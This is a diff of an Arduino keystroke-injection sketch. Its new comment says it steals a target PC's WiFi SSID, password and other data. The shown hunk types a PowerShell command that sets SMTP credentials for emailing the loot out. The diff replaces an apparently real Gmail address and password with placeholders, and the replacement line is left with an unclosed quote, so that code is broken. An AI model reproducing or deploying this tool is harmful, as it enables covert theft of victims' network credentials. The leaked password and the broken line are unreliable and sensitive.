@@ -1,5 +1,5 @@
 /*
- * Generated with <3 by Dckuino.js, an open source project !
+ This script steals the target PC's connected WiFi's SSID and password as well as some other info.
  */
 
 #include "Keyboard.h"
@@ -100,7 +100,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('kennysemailaddress@gmail.com', 'fQQmTAHf$u)3')");
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('INSERTEMAILADDRESS@gmail.com', 'PASSWORD");
 
   typeKey(KEY_RETURN);
 
